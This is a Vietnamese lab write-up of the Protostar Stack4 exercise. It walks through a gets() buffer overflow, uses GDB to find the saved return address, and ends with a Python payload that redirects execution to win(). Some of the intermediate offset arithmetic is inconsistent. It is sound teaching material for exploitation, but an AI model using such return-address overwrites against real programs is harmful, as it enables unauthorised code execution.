## Stack4 
- Source code C:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
- GDB `disass`:
```asm 
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave  
0x0804841e <main+22>:   ret    
```

- Goal của bài này cũng là thay đổi execution flow, nhưng mà không có biến nào để ghi đè cả??
- Sau khi hàm `main` kết thúc, nó sẽ cần trao trả control lại cho hàm caller của nó (`main` là calle - bị gọi). Caller của `main` là `__libc_start_main`
- `__libc_start_main` sẽ gọi hàm `main`, trước khi gọi thì nó sẽ phải lưu địa chỉ trả về để lát nữa `main` thực thi xong thì có thể dùng instruction `ret` để về lại địa chỉ trả về đó
- Địa chỉ trả về này **nằm trên stack**, trước khi gọi hàm main, bằng lệnh `info frame` của gdb ta có thể xem được saved EIP (còn gọi là return address - là địa chỉ mà execution flow của `__libc_start_main` tiếp tục sau khi hàm `main` return)
```
(gdb) info frame 
Stack level 0, frame at 0xbffff6b0:
 eip = 0x8048408 in main (stack4/stack4.c:12); saved eip 0xb7eadc76
 source language c.
 Arglist at 0xbffff6a8, args: argc=1, argv=0xbffff754
 Locals at 0xbffff6a8, Previous frame's sp is 0xbffff6b0
 Saved registers:
  eip at 0xbffff6ac
```
- Vậy `0xb7eadc76` sẽ là địa chỉ được nhảy tới tiếp sau khi `main` thực thi xong, gõ `x/i 0xb7eadc76` ta sẽ thấy đoạn mã asm của `__libc_start_main` tại offset 230:
```asm
(gdb) x/i 0xb7eadc76
0xb7eadc76 <__libc_start_main+230>:     mov    DWORD PTR [esp],eax
```
- Giờ thì ta sẽ phải tính số bytes khoảng cách từ saved EIP đến biến `buffer`. Đầu tiên sau khi return address được push lên stack, tiếp theo sẽ tới lượt EBP được push:
```
(gdb) x/20x $esp 
return address-----|
                   V
0xbffff6ac:     0xb7eadc76      0x00000001      0xbffff754      0xbffff75c
0xbffff6bc:     0xb7fe1848      0xbffff710      0xffffffff      0xb7ffeff4
0xbffff6cc:     0x0804824b      0x00000001      0xbffff710      0xb7ff0626
0xbffff6dc:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000
0xbffff6ec:     0x00000000      0xbffff728      0x2a41cdd5      0x0014dbc5
(gdb) x $eip 
0x8048408 <main>:       0x83e58955
(gdb) x/i $eip 
0x8048408 <main>:       push   ebp // lệnh tiếp theo
(gdb) 
```
- Vậy là cộng 4 bytes, tới đoạn `sub    esp,0x50` sẽ mở rộng stack thêm `0x50 = 80 bytes`, cùng với 8 bytes được padding sau câu lệnh `and    esp,0xfffffff0` => 80+4+8 = **92 bytes**
- Vậy là return address lúc này cách đỉnh của stack 84 bytes. Biến mà ta ghi đè được nằm ở ô `esp+0x10`, tức là cách đỉnh stack `0x0c = 12` bytes (từ byte thứ 13 - 16 là data của ô này)
- Tóm lại là biến `buffer` sẽ cách return address **92 - 16 = 76 bytes**, từ byte thứ 77 sẽ là data của return address
- Ok vậy mảnh ghép cuối cùng chỉ còn là địa chỉ mà ta cần ghi đè để khi kết thúc hàm main thì nhảy tới, đó là address của `win`. Objdump như bài trước và ta tìm ra giá trị `080483f4`, craft payload:
```python 
user@protostar:/opt/protostar/bin$ python -c 'print "A"*76  + "\xf4\x83\x04\x08"' |./stack4
code flow successfully changed
Segmentation fault
user@protostar:/opt/protostar/bin$ 
```
